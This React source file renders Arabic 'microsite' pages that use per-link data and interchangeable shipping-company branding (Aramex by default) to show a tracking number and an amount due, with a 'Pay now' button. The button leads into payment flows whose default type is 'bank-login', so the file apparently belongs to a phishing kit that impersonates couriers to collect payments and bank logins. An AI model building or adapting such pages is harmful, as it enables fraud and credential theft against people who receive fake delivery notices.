import React from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { gccShippingServices } from "@/lib/gccShippingServices";
import SEOHead from "@/components/SEOHead";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  RefreshCw,
  AlertTriangle,
  ArrowLeft,
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading, error, isError } = useLink(id);
  
  // Safely get country data
  let countryData;
  try {
    countryData = getCountryByCode(country || "");
  } catch (err) {
    console.error('Error getting country data:', err);
    countryData = null;
  }
  
  // Log for debugging
  React.useEffect(() => {
    try {
      console.log('Microsite render:', { country, type, id, isLoading, isError, hasLink: !!link, hasError: !!error });
    } catch (err) {
      console.error('Error in useEffect:', err);
    }
  }, [country, type, id, isLoading, isError, link, error]);
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center">
          <div className="animate-pulse text-xl mb-4">جاري التحميل...</div>
          <div className="text-sm text-muted-foreground">يرجى الانتظار</div>
        </div>
      </div>
    );
  }
  
  if (isError || error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    console.error('Microsite error:', { error, message: errorMessage, country, type, id });
    
    // Don't show error UI if it's just a loading/not found issue
    if (errorMessage.includes('غير موجود') || errorMessage.includes('not found')) {
      return (
        <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
          <Card className="max-w-md mx-4 p-8 text-center">
            <h2 className="text-2xl font-bold mb-2 text-foreground">الرابط غير موجود</h2>
            <p className="text-muted-foreground mb-4">الرجاء التحقق من الرابط</p>
            <Button variant="outline" onClick={() => navigate("/")}>
              العودة للرئيسية
            </Button>
          </Card>
        </div>
      );
    }
    
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <Card className="max-w-md mx-4 p-8 text-center">
          <div className="w-16 h-16 bg-destructive/20 rounded-full flex items-center justify-center mx-auto mb-4">
            <AlertTriangle className="w-8 h-8 text-destructive" />
          </div>
          <h2 className="text-2xl font-bold mb-2 text-foreground">حدث خطأ</h2>
          <p className="text-muted-foreground mb-4">
            {errorMessage || "حدث خطأ أثناء تحميل الرابط"}
          </p>
          <div className="flex gap-3 justify-center">
            <Button onClick={() => window.location.reload()}>
              <RefreshCw className="w-4 h-4 ml-2" />
              إعادة المحاولة
            </Button>
            <Button variant="outline" onClick={() => navigate("/")}>
              العودة للرئيسية
            </Button>
          </div>
        </Card>
      </div>
    );
  }
  
  if (!link) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <Card className="max-w-md mx-4 p-8 text-center">
          <h2 className="text-2xl font-bold mb-2 text-foreground">الرابط غير موجود</h2>
          <p className="text-muted-foreground mb-4">الرجاء التحقق من الرابط</p>
          <Button variant="outline" onClick={() => navigate("/")}>
            العودة للرئيسية
          </Button>
        </Card>
      </div>
    );
  }
  
  // If country data is missing, continue with defaults
  if (!countryData) {
    console.warn('Country data not found for:', country);
  }
  
  // Safely extract payload with defaults
  let payload: any = {};
  let isShipping = false;
  let serviceName = 'خدمة الشحن';
  let serviceKey = 'aramex';
  let serviceBranding: any = null;
  let serviceDescription = 'خدمة شحن - نظام دفع آمن ومحمي';
  let displayName = 'شحنة';
  let seoTitle = 'تتبع وتأكيد الدفع';
  let seoDescription = 'تتبع شحنتك وأكمل الدفع بشكل آمن';
  let seoImage = '/og-aramex.jpg';
  
  try {
    payload = link?.payload || {};
    isShipping = link?.type === 'shipping';
    
    // Get service branding for SEO and display with safe defaults
    serviceName = isShipping 
      ? (payload.service_name || payload.service_key || 'خدمة الشحن')
      : (payload.chalet_name || 'شاليه');
    
    try {
      serviceKey = payload.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
      serviceBranding = getServiceBranding(serviceKey);
    } catch (err) {
      console.error('Error getting service branding:', err);
      serviceBranding = getServiceBranding('aramex'); // Fallback
    }
    
    // Update URL to include service information for better SEO
    React.useEffect(() => {
      try {
        const currentUrl = new URL(window.location.href);
        if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
          currentUrl.searchParams.set('service', serviceKey);
          window.history.replaceState({}, '', currentUrl.toString());
        }
      } catch (err) {
        console.error('Error updating URL:', err);
      }
    }, [isShipping, serviceKey]);
    
    // Get service description from serviceBranding first (company description), then from gccShippingServices
    try {
      // Use company branding description as primary
      if (serviceBranding?.description) {
        serviceDescription = serviceBranding.description;
      } else if (gccShippingServices && typeof gccShippingServices === 'object') {
        const allServices = Object.values(gccShippingServices).flat();
        const serviceData = allServices.find((s: any) => s?.key === serviceKey);
        if (serviceData?.description) {
          serviceDescription = serviceData.description;
        }
      }
    } catch (err) {
      console.error('Error getting service description:', err);
      // Keep default description
    }
    
    displayName = isShipping 
      ? `شحنة ${serviceName}` 
      : (payload.chalet_name || 'شاليه');
    
    // SEO metadata - use company description prominently
    seoTitle = isShipping 
      ? `${serviceName} - تتبع وتأكيد الدفع` 
      : `حجز شاليه - ${payload.chalet_name || 'شاليه'}`;
    
    seoDescription = isShipping
      ? `${serviceDescription} - تتبع شحنتك رقم ${payload.tracking_number || ''} وأكمل الدفع بشكل آمن`
      : `احجز ${payload.chalet_name || 'شاليه'} في ${countryData?.nameAr || 'الدولة'} - ${payload.nights || 1} ليلة لـ ${payload.guest_count || 2} ضيف`;
    
    seoImage = serviceBranding?.ogImage || serviceBranding?.heroImage || '/og-aramex.jpg';
  } catch (err) {
    console.error('Error processing link data:', err);
    // Use safe defaults already set above
  }
  
  // Safely get current URL
  let currentUrl = '';
  try {
    currentUrl = window.location.href;
  } catch (err) {
    console.error('Error getting URL:', err);
    currentUrl = '';
  }

  try {
    return (
      <>
        <SEOHead 
          title={seoTitle}
          description={seoDescription}
          image={seoImage}
          url={currentUrl}
          type="website"
          serviceName={serviceName}
          serviceDescription={serviceDescription}
        />
        <div 
          className="min-h-screen bg-background" 
          dir="rtl"
        >
          {/* Hero Section - matching other payment pages */}
          <div className="relative w-full h-48 sm:h-64 overflow-hidden">
            {serviceBranding?.heroImage && (
              <img 
                src={serviceBranding.heroImage} 
                alt={serviceName}
                className="w-full h-full object-cover"
              />
            )}
            <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
            
            {/* Service Logo Overlay - Dynamic based on selected service */}
            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
              {serviceBranding?.logo ? (
                <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                  <img 
                    src={serviceBranding.logo} 
                    alt={serviceName}
                    className="h-12 sm:h-16 w-auto max-w-[200px] object-contain"
                    onError={(e) => {
                      console.error('Failed to load service logo:', serviceBranding.logo);
                      e.currentTarget.style.display = 'none';
                    }}
                  />
                </div>
              ) : null}
            </div>
            
            {/* Title Overlay */}
            <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
              <div className="text-right">
                <h2 className="text-lg sm:text-2xl font-bold mb-1">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</h2>
                <p className="text-xs sm:text-sm opacity-90">{isShipping ? 'خدمة شحن' : 'حجز شاليه'}</p>
              </div>
            </div>
          </div>

          <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
            <div className="max-w-2xl mx-auto">
              <Card 
                className="p-4 sm:p-8 shadow-2xl border-t-4" 
                style={{ borderTopColor: serviceBranding?.colors?.primary || '#006C35' }}
              >
                {/* Header - matching other pages */}
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <h1 className="text-xl sm:text-3xl font-bold">
                    {isShipping ? 'تتبع وتأكيد الدفع' : 'تفاصيل الحجز'}
                  </h1>
                  
                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                    style={{
                      background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}, ${serviceBranding?.colors?.secondary || '#004A2C'})`,
                    }}
                  >
                    <Package className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                  </div>
                </div>

                {/* Content */}
                {/* Shipping Info Display - matching PaymentDetails */}
                {(isShipping && payload) && (
                  <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
                    <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
                    <div className="space-y-2 text-xs sm:text-sm">
                      {payload.tracking_number && (
                        <div className="flex items-center gap-2">
                          <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                          <span className="text-muted-foreground">رقم الشحنة:</span>
                          <span className="font-semibold">{payload.tracking_number}</span>
                        </div>
                      )}
                      {payload.package_description && (
                        <div className="flex items-center gap-2">
                          <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                          <span className="text-muted-foreground">وصف الطرد:</span>
                          <span className="font-semibold">{payload.package_description}</span>
                        </div>
                      )}
                      {(payload.cod_amount || 0) > 0 && (
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                          <span className="text-muted-foreground">مبلغ COD:</span>
                          <span className="font-semibold">{formatCurrency(payload.cod_amount || 0, countryData?.currency || 'ر.س')}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}
                
                {/* Payment Summary - matching PaymentDetails */}
                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                  <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
                    <span className="text-muted-foreground">الخدمة</span>
                    <span className="font-semibold">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</span>
                  </div>
                  
                  <div 
                    className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
                    style={{
                      background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}15, ${serviceBranding?.colors?.secondary || '#004A2C'}15)`
                    }}
                  >
                    <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
                    <span className="text-xl sm:text-2xl font-bold" style={{ color: serviceBranding?.colors?.primary || '#006C35' }}>
                      {formatCurrency(isShipping ? (payload.cod_amount || 0) : (payload.total_amount || 0), countryData?.currency || 'ر.س')}
                    </span>
                  </div>
                </div>
              
              
              {/* Payment Button */}
              <Button
                size="lg"
                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                style={{
                  background: `linear-gradient(135deg, ${serviceBranding?.colors?.primary || '#006C35'}, ${serviceBranding?.colors?.secondary || '#004A2C'})`
                }}
                onClick={() => {
                  try {
                    if (link?.id) {
                      // Get payment flow type from payload
                      const flowType = payload?.payment_flow_type || 'bank-login';
                      
                      // All flows start with recipient page
                      navigate(`/pay/${link.id}/recipient`);
                    }
                  } catch (err) {
                    console.error('Error navigating:', err);
                  }
                }}
              >
                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                <span>ادفع الآن</span>
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
              </Button>
              
                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </Card>
            </div>
          </div>
        </div>
    </>
    );
  } catch (renderError) {
    console.error('Error rendering Microsite:', renderError);
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <Card className="max-w-md mx-4 p-8 text-center">
          <h2 className="text-2xl font-bold mb-2 text-foreground">حدث خطأ في تحميل الصفحة</h2>
          <p className="text-muted-foreground mb-4">يرجى المحاولة مرة أخرى</p>
          <Button variant="outline" onClick={() => navigate("/")}>
            العودة للرئيسية
          </Button>
        </Card>
      </div>
    );
  }
};

export default Microsite;
